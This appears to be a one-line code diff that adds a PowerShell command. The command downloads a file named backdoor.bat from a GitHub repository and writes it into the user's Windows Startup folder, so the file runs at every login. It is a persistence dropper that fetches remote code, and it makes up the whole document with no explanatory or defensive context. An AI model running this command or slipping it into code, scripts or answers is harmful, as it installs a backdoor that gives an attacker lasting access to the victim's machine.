@@ -1,0 +1,1 @@
+powershell -nop -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/timberh789/elvis-backdoor/main/backdoor.bat', '%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat')"
